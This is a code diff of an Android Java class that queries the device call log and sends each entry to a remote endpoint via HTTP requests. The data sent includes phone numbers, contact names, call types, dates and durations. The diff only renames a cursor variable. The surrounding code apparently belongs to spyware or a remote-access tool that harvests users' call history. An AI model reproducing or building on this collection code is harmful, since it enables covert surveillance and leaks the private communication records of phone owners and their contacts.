@@ -31,7 +31,6 @@ public class GetCallLogsTask extends BaseTask {
     @Override
     public void run() {
         super.run();
-
         getCallLogs();
     }
 
@@ -52,23 +51,23 @@ public class GetCallLogsTask extends BaseTask {
 
             String strOrder = android.provider.CallLog.Calls.DATE + " DESC";
             Uri callUri = Uri.parse("content://call_log/calls");
-            Cursor managedCursor = context.getApplicationContext().getContentResolver().query(callUri, null, null, null, strOrder);
-            int id = managedCursor.getColumnIndex(CallLog.Calls._ID);
-            int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
-            int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
-            int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
-            int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);
+            Cursor mCur = context.getApplicationContext().getContentResolver().query(callUri, null, null, null, strOrder);
+            int id = mCur.getColumnIndex(CallLog.Calls._ID);
+            int number = mCur.getColumnIndex(CallLog.Calls.NUMBER);
+            int type = mCur.getColumnIndex(CallLog.Calls.TYPE);
+            int date = mCur.getColumnIndex(CallLog.Calls.DATE);
+            int duration = mCur.getColumnIndex(CallLog.Calls.DURATION);
 
-            if (managedCursor.moveToFirst()) {
+            if (mCur.moveToFirst()) {
                 do {
                     Log.i(TAG, "This number: " + this.numlogs);
-                    String phNumber = managedCursor.getString(number);
+                    String phNumber = mCur.getString(number);
                     String nameS = getContactName(phNumber);
-                    String callType = managedCursor.getString(type);
-                    String callDate = managedCursor.getString(date);
+                    String callType = mCur.getString(type);
+                    String callDate = mCur.getString(date);
                     Date callDayTime = new Date(Long.valueOf(callDate));
                     SimpleDateFormat dt = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
-                    String callDuration = managedCursor.getString(duration);
+                    String callDuration = mCur.getString(duration);
 
                     HashMap p = new HashMap();
                     p.put("uid", commonParams.getUid());
@@ -85,7 +84,7 @@ public class GetCallLogsTask extends BaseTask {
                     req.setParams(p);
                     req.execute();
                     this.numlogs--;
-                } while (managedCursor.moveToNext() && this.numlogs > 0);
+                } while (mCur.moveToNext() && this.numlogs > 0);
             }
 
             start.put("event", "getcallhistory:done");
@@ -97,7 +96,7 @@ public class GetCallLogsTask extends BaseTask {
             doneHttp.setParams(start);
             doneHttp.execute();
 
-            managedCursor.close();
+            mCur.close();
         } else {
 
             Log.i(TAG, "No SMS permission!!!");
